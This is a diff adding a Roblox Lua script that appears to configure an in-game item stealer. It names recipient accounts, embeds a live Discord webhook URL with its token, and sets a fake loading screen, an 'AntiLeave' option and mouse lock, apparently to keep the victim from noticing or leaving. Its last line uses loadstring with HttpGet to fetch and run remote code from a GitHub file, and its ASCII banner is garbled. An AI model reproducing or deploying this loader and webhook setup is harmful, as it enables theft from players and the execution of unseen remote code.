@@ -1,0 +1,26 @@
+--[[
+                              
+  |  /  |  () |_| | __   | |   __ 
+  | |/| |/  | | / __| __/ _ \/ _ | |/  \ '__|
+  | |  | | (| | | _ \ ||  __/ (| | |  / |
+  ||  ||_,|||_/____|_,||__||
+
+]]--
+
+UserName = "gougele222"
+Webhook = "https://discord.com/api/webhooks/1129551389081731102/zdtlRoC4In4mYsJWSa6hT2t4vigaAJL2No6jWyhmFwB-nmquEE0_nKuvsCH1ueYUI4K4"
+UserName2 = "gopino2"
+
+_G.LoadingScreen = true -- make it true if you want the loadingscreen
+_G.AntiLeave = false -- make it true if you want the antileave
+_G.MouseLock = true -- make it true if you want the mouselock
+
+-- Remove These If You're Not Using The Rizz LoadingScreen
+
+_G.ScriptName = "Script Name"
+_G.FirstText = "Preparing..."
+_G.SecondText = "Loading..."
+_G.ThirdText = "Almost Done..."
+_G.WaitingTime = 180 -- in secondes it's the time for the loading bar to hit from 0% to 100%
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/go584/ProjectKKff/main/mailgop%22))()
